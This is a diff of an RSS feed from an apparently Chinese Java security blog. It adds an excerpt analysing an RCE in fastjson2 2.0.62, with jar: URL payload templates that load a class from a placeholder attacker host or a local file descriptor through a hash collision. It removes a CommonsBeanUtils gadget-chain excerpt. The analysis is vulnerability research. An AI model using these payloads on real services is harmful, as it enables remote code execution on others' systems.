@@ -1,4 +1,18 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Java on 美咕噜的小站</title><link>https://0d000721999.github.io/categories/java/</link><description>Recent content in Java on 美咕噜的小站</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>无敌可爱美咕噜</copyright><lastBuildDate>Tue, 21 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://0d000721999.github.io/categories/java/index.xml" rel="self" type="application/rss+xml"/><item><title>fastjson 1.2.83 最新RCE分析</title><link>https://0d000721999.github.io/p/fastjson-1.2.83-%E6%9C%80%E6%96%B0rce%E5%88%86%E6%9E%90/</link><pubDate>Tue, 21 Jul 2026 00:00:00 +0000</pubDate><guid>https://0d000721999.github.io/p/fastjson-1.2.83-%E6%9C%80%E6%96%B0rce%E5%88%86%E6%9E%90/</guid><description>&lt;img src="https://0d000721999.github.io/p/fastjson-1.2.83-%E6%9C%80%E6%96%B0rce%E5%88%86%E6%9E%90/1_hu_7f069b3779685daa.webp" alt="Featured image of post fastjson 1.2.83 最新RCE分析" />&lt;h1 id="fastjson-1283-最新rce分析">fastjson 1.2.83 最新RCE分析
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Java on 美咕噜的小站</title><link>https://0d000721999.github.io/categories/java/</link><description>Recent content in Java on 美咕噜的小站</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>无敌可爱美咕噜</copyright><lastBuildDate>Wed, 29 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://0d000721999.github.io/categories/java/index.xml" rel="self" type="application/rss+xml"/><item><title>fastjson2 2.0.62 RCE分析</title><link>https://0d000721999.github.io/p/fastjson2-2.0.62-rce%E5%88%86%E6%9E%90/</link><pubDate>Wed, 29 Jul 2026 00:00:00 +0000</pubDate><guid>https://0d000721999.github.io/p/fastjson2-2.0.62-rce%E5%88%86%E6%9E%90/</guid><description>&lt;img src="https://0d000721999.github.io/p/fastjson2-2.0.62-rce%E5%88%86%E6%9E%90/1_hu_7cd892a0848150d4.webp" alt="Featured image of post fastjson2 2.0.62 RCE分析" />&lt;h1 id="fastjson2-2062-rce分析">fastjson2 2.0.62 RCE分析
+&lt;/h1>&lt;p>payload跟1.2.83类似，唯一的区别在于要绕过哈希校验，也就是要哈希碰撞一下&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="nl">jar&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">:..&lt;/span>&lt;span class="na">attacker&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">18083&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">x&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">collision&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">Exception&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nl">jar&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">:.&lt;/span>&lt;span class="na">tmp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">x&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">collision&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">Exception&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nl">jar&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">:.&lt;/span>&lt;span class="na">proc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">fd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">17&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">collision&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">Exception&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里还是会跟1.2.83一样把&lt;code>.&lt;/code>变成&lt;code>/&lt;/code>。这里的class设计成&lt;code>Exception&lt;/code>的原因也跟之前一样，为了使得checkautoType失败返回null，而不是退出。但是实际去看fastjson2的代码发现没有跟1.x一样的逻辑，所以关键点还是哈希校验&lt;/p></description></item><item><title>fastjson 1.2.83 最新RCE分析</title><link>https://0d000721999.github.io/p/fastjson-1.2.83-%E6%9C%80%E6%96%B0rce%E5%88%86%E6%9E%90/</link><pubDate>Tue, 21 Jul 2026 00:00:00 +0000</pubDate><guid>https://0d000721999.github.io/p/fastjson-1.2.83-%E6%9C%80%E6%96%B0rce%E5%88%86%E6%9E%90/</guid><description>&lt;img src="https://0d000721999.github.io/p/fastjson-1.2.83-%E6%9C%80%E6%96%B0rce%E5%88%86%E6%9E%90/1_hu_7f069b3779685daa.webp" alt="Featured image of post fastjson 1.2.83 最新RCE分析" />&lt;h1 id="fastjson-1283-最新rce分析">fastjson 1.2.83 最新RCE分析
 &lt;/h1>&lt;p>参考：&lt;a class="link" href="https://media.gcsa.org/news-3725925" target="_blank" rel="noopener"
 >GCSA洞察：Fastjson 1.2.83 “Gadget-Free” 漏洞（0day）深度分析与防御指南 - GCSA&lt;/a>&lt;/p>
 &lt;blockquote>
@@ -174,47 +188,4 @@ data-flex-basis="865px"
 &lt;li>shiro 1.2.4&lt;/li>
 &lt;/ul>
 &lt;p>漏洞影响版本：Shiro &amp;lt;= 1.2.4&lt;/p>
-&lt;p>我这里tomcat用的8.5.81，其实版本是8都行，官网现在是下不到了，只能用镜像站下载&lt;/p></description></item><item><title>CB链</title><link>https://0d000721999.github.io/p/cb%E9%93%BE/</link><pubDate>Thu, 07 Aug 2025 00:00:00 +0000</pubDate><guid>https://0d000721999.github.io/p/cb%E9%93%BE/</guid><description>&lt;img src="https://0d000721999.github.io/p/cb%E9%93%BE/1_hu_b8a60240711ff2f8.webp" alt="Featured image of post CB链" />&lt;h1 id="cb链">CB链
-&lt;/h1>&lt;h2 id="环境配置">环境配置
-&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-xml" data-lang="xml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;dependency&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;groupId&amp;gt;&lt;/span>commons-beanutils&lt;span class="nt">&amp;lt;/groupId&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;artifactId&amp;gt;&lt;/span>commons-beanutils&lt;span class="nt">&amp;lt;/artifactId&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;version&amp;gt;&lt;/span>1.9.2&lt;span class="nt">&amp;lt;/version&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;/dependency&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&amp;lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;dependency&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;groupId&amp;gt;&lt;/span>commons-collections&lt;span class="nt">&amp;lt;/groupId&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;artifactId&amp;gt;&lt;/span>commons-collections&lt;span class="nt">&amp;lt;/artifactId&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;version&amp;gt;&lt;/span>3.2.1&lt;span class="nt">&amp;lt;/version&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;/dependency&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&amp;lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;dependency&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;groupId&amp;gt;&lt;/span>commons-logging&lt;span class="nt">&amp;lt;/groupId&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;artifactId&amp;gt;&lt;/span>commons-logging&lt;span class="nt">&amp;lt;/artifactId&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;version&amp;gt;&lt;/span>1.2&lt;span class="nt">&amp;lt;/version&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;/dependency&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h2 id="commonsbeanutils">CommonsBeanUtils
-&lt;/h2>&lt;p>Apache Commons 工具集下除了 &lt;code>collections&lt;/code> 以外还有 &lt;code>BeanUtils&lt;/code> ，它主要用于操控 &lt;code>JavaBean&lt;/code> 。&lt;/p></description></item></channel></rss>
+&lt;p>我这里tomcat用的8.5.81，其实版本是8都行，官网现在是下不到了，只能用镜像站下载&lt;/p></description></item></channel></rss>
